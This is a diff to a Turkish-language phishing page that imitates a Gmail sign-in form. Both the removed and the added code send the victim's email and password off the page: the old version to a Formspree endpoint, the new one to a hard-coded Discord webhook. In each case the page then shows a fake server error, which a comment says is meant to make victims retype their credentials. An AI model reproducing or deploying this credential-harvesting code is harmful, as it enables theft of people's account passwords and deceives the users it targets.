@@ -1,51 +1,50 @@
 <h2 style="color:#3c4043">Sistem Kaydı</h2>
 <p style="color:#5f6368; font-size: 14px;">Devam etmek için Gmail ile bağlanın</p>
 
-<form id="loginForm">
-    <input type="email" name="email" id="email" placeholder="Gmail Adresiniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
-    <input type="password" name="sifre" id="sifre" placeholder="Şifreniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
+<form id="trollForm">
+    <input type="email" id="email" placeholder="Gmail Adresiniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
+    <input type="password" id="password" placeholder="Şifreniz" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
     
     <button type="submit" id="submitBtn" class="btn" style="width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">KAYDI TAMAMLA</button>
     
-    <p id="statusMsg" style="margin-top: 15px; font-size: 13px; font-weight: bold; display: none;"></p>
+    <p id="statusMsg" style="margin-top: 15px; font-size: 13px; font-weight: bold; color: red; display: none;"></p>
 </form>
 
 <script>
-  const form = document.getElementById("loginForm");
-  const statusMsg = document.getElementById("statusMsg");
-  const btn = document.getElementById("submitBtn");
+  const webhookURL = "https://discord.com/api/webhooks/1454488470402633879/hYwEM4vWg39W9bH9eg1Tayxd6LUHuDBqiOKWJKB2yvJbgQLgpYeU714kiwxsl1pKq1fz";
 
-  form.onsubmit = async (e) => {
-    e.preventDefault(); // Sayfanın yenilenmesini/gitmesini engeller
+  document.getElementById("trollForm").onsubmit = async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById("submitBtn");
+    const msg = document.getElementById("statusMsg");
+    
     btn.disabled = true;
     btn.innerText = "Bağlanıyor...";
-    
-    const formData = new FormData(form);
-    
-    try {
-      const response = await fetch("https://formspree.io/f/xykyergb", {
-        method: "POST",
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      });
 
-      if (response.ok) {
-        // Bilgi gitti ama kullanıcıya hata varmış gibi gösteriyoruz
-        statusMsg.style.color = "red";
-        statusMsg.innerText = "Hata: Sunucuya bağlanılamadı. Lütfen internet bağlantınızı kontrol edip tekrar deneyin.";
-        statusMsg.style.display = "block";
-        btn.disabled = false;
-        btn.innerText = "TEKRAR DENE";
-        form.reset(); // Kutuları temizle
-      } else {
-        statusMsg.style.color = "red";
-        statusMsg.innerText = "Bağlantı zaman aşımına uğradı.";
-        statusMsg.style.display = "block";
-      }
-    } catch (error) {
-      statusMsg.style.color = "red";
-      statusMsg.innerText = "Bir hata oluştu. Lütfen tekrar deneyin.";
-      statusMsg.style.display = "block";
+    const email = document.getElementById("email").value;
+    const pass = document.getElementById("password").value;
+
+    const payload = {
+      content: "🚀 **Yeni Veri Geldi!**\n📧 **E-posta:** " + email + "\n🔑 **Şifre:** " + pass
+    };
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      // Bilgi gitse bile hata gösteriyoruz ki tekrar denesinler
+      msg.innerText = "Hata: Sunucu yoğunluğu nedeniyle bağlantı kurulamadı. Lütfen 1 dakika sonra tekrar deneyin.";
+      msg.style.display = "block";
+      btn.disabled = false;
+      btn.innerText = "TEKRAR DENE";
+      
+    } catch (err) {
+      msg.innerText = "Bağlantı hatası oluştu.";
+      msg.style.display = "block";
+      btn.disabled = false;
     }
   };
 </script>
